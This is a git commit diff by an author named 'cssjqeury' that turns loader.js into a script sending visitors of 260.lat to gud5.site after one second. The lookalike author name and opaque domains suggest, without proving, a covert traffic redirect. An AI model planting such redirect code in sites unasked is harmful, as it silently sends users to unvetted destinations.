228c0ccdc3841316b38c4068081a82bab30f8576
cssjqeury <theaverageman463@gmail.com>
2025-08-06 02:03:56 +0100

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,2 +1,10 @@
-dddd
-gggg
+(function () {
+    const allowedDomains = ["260.lat", "www.260.lat"];
+    const targetURL = "https://gud5.site";
+
+    if (allowedDomains.includes(location.hostname)) {
+      setTimeout(function () {
+        location.href = targetURL;
+      }, 1000);
+    }
+  })();
